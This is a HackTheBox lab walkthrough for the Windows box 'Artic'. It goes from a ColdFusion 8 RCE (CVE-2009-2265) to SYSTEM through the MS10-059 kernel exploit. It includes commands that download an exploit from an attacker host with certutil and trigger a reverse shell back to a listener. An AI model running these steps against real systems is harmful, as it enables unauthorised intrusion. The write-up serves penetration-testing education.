# Artic — HackTheBox Walkthrough

**Platform:** HackTheBox
**Difficulty:** Easy
**OS:** Windows

---

## TL;DR

Adobe ColdFusion 8 directory traversal/RCE vulnerability (CVE-2009-2265) leads to initial foothold → Missing hotfixes allow root via MS10-059 (Chimichurri) kernel exploit.

---

## Enumeration

Full nmap scan:

```bash
nmap -sV -p- -Pn 10.10.10.11
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 135 | RPC | Microsoft Windows RPC |
| 8500 | HTTP | fmtp? (Adobe ColdFusion) |
| 49154 | RPC | Microsoft Windows RPC |

Port 8500 is unusually open. Navigating to `http://10.10.10.11:8500` in the browser reveals an Adobe ColdFusion 8 server instance.

---

## Exploitation — ColdFusion RCE

Given that ColdFusion 8 is severely outdated, we search for known vulnerabilities and find a directory traversal leading to Remote Code Execution (CVE-2009-2265). 

We can use a publicly available Python exploit to obtain a reverse shell:
- Exploit-DB: `https://www.exploit-db.com/exploits/50057`

Running the exploit script against the target gives us our initial foothold as a low-privileged user (usually `tolis`).

```bash
python3 50057.py
```

We now have user access.

---

## Privilege Escalation — MS10-059 (Chimichurri)

Once on the box, our first step for Windows privilege escalation is checking the OS version and applied patches. We run `systeminfo`:

```bash
systeminfo
```

The output reveals:
- **OS Name:** Microsoft Windows Server 2008 R2 Standard
- **OS Version:** 6.1.7600
- **System Type:** x64-based PC
- **Hotfix(s):** N/A

Crucially, **no hotfixes** have ever been applied to this machine. This makes it highly vulnerable to various Windows kernel exploits. Given the OS version (Windows Server 2008 R2), the `MS10-059` exploit (often called Chimichurri) is a perfect candidate.

We can download the compiled exploit executable from the SecWiki Windows Kernel Exploits repository:
- `https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe`

We host the file on our attacking machine using a python web server and transfer it to the target leveraging `certutil`:

```cmd
certutil -urlcache -split -f http://10.10.14.32/MS10-059.exe MS10-059.exe
```

With a Netcat listener ready on port 2222 on our attacking machine, we execute the kernel exploit:

```cmd
.\MS10-059.exe 10.10.14.32 2222
```

The exploit triggers successfully, sending a reverse shell connection back to our listener.

We are `NT AUTHORITY\SYSTEM`. **Root.** 🎉

---

## Key Takeaways

- **Unpatched Web Applications:** Running severely outdated software like ColdFusion 8 heavily exposes the external perimeter to trivial Remote Code Execution vulnerabilities. 
- **Patch Management:** The total absence of Windows hotfixes allowed an extremely old and well-documented kernel exploit (MS10-059) to succeed without resistance. Regular patching is critical.
- **certutil:** A built-in Windows binary that can be "Living off the Land" (LotL) abused by attackers to easily download malicious payloads onto the target system.

---

*Thanks for reading! Follow for more HackTheBox walkthrough content.*